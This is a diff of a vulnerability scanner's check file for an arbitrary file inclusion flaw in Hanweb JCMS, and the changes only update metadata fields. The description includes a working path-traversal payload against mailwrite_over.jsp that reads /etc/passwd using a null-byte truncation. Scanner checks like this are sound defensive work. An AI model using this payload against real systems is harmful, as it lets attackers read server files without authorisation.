@@ -5,20 +5,20 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
 class Vuln(ABVuln):
-    vuln_id = 'hanweb_0012' # 平台漏洞编号，留空
-    name = '大汉cms 任意文件包含'  # 漏洞名称
+    vuln_id = 'Hanweb_0012' # 平台漏洞编号，留空
+    name = '大汉JCMS 任意文件包含'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.LFI # 漏洞类型
     disclosure_date = '2015-10-21'  # 漏洞公布时间
     desc = '''
-        大汉科技（hanweb）大汉cms，写信提的时候截断包含：
+        大汉科技（Hanweb）大汉cms，写信提的时候截断包含：
         lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../etc/passwd%00.ftl
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
-    product = '大汉科技'  # 漏洞应用名称
-    product_version = '大汉cms'  # 漏洞应用版本
+    ref = 'Unknown'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
+    product = 'JCMS(Hanweb)'  # 漏洞应用名称
+    product_version = 'Unknown'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = '1e232679-d0da-4741-9c7c-2e1a4b6588bb'
